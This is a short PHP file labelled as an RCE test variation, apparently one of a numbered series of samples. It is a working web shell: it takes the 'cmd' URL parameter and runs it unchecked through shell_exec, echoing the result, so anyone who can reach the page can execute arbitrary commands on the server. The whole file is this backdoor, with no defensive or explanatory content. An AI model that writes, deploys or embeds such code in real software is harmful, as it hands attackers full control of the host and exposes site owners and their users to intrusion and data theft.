<?php
// RCE test variation #314
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>